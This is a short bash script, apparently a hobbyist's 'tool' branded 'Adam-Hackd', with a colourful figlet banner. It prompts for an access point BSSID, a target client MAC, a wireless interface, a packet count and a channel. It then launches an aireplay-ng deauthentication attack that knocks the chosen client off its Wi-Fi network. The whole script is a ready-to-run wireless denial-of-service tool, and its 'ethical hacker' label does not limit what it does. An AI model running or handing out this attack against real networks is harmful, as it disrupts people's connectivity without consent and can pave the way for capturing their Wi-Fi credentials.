#!/bin/bash

sleep 1
#figlet Adam-Hackd
RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"
printf "${GREEN}"
printf "=================================\n"
printf "${ORANGE}"
figlet -w 200 -f standard "Adam-Hackd"
printf "${BLUE}"
figlet -w 200 -f  small "Ethical hacker"
printf "${GREEN}"
printf "=================================\n"
printf "${STOP}"
echo "welcom to my new tools...!"
read -p "Enter Bssid :# " bssid
read -p "Enter mac Target :# " t
read -p "Enter Intrface :# " i
read -p "Enter number of packet :# " pack
read -p "Enter number channel :# " c
sleep 1
sudo iwconfig $i channel $c
sleep 1
sudo xterm -e aireplay-ng -0 $pack -a $bssid -c $t $i
echo "Thanks for try my tools...!"
